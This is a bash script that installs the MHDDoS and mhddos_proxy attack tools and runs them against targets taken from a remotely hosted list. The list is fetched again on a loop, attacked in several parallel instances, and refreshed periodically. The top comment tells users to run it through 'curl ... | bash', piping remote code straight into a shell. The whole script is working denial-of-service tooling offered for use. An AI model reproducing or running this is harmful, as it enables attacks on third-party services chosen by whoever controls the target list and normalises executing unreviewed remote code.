#!/bin/bash
##### Use next command in local linux terminal to run this script.
#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash  <<<<<
##### To kill script press CTRL+C several times.

## "num_of_copies" allows to start several copies of runner.py.
## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets
## This is different from "multiple targets" in runner.py. Built in runner.py "multiple targets" can attack multiple IP's but only with same one method.
## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods, if specified.
## By default 2 copies launched, can be passed as first parameter
num_of_copies="${1:-2}"

## Restart script every N seconds (600s = 10m, 1800s = 30m, 3600s = 60m).
## It allows to download updates for mhddos_proxy, MHDDoS and target list.
## By default 1800, can be passed as second parameter
restart_interval="${1:-1800}"



#sudo apt update

# Install git if it doesn't installed already
if [ ! -f /usr/bin/git ]; then
   sudo apt install git -y
fi

# Install python3 if it doesn't installed already
if [ ! -f /usr/bin/python3 ]; then
   sudo apt install python3 -y
fi

# Install pip if it doesn't installed already
if [ ! -f /usr/bin/pip ]; then
   apt install python3-pip  -y
fi
pip install --upgrade pip > /dev/null #No output. Resolved some problems with pip on debian


#Install latest version of mhddos_proxy and MHDDoS
cd ~
rm -rf mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
git clone https://github.com/MHProDev/MHDDoS.git
python3 -m pip install -r MHDDoS/requirements.txt

while true
echo "#####################################"
do
   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py" | wc -l)
   
   echo -e "\nNumber of targets in list: " $list_size "\n"

   # Create list with random numbers. To choose random targets from list on next step.
   random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
   echo -e "random numbers: " $random_numbers "\n"
   
   # Print all randomly selected targets on screen
   echo -e "Choosen targets:\n"
   for i in $random_numbers
   do
             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
             echo -e "    "$target"\n"
   done
      
   # Launch multiple runner instances with different targets.
   for i in $random_numbers
   do
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
           
            #echo $cmd_line
            
            python3 ~/mhddos_proxy/$cmd_line&
   done
echo "#####################################"
sleep $restart_interval
echo -e "RESTARTING\n"
pkill -f start.py
done
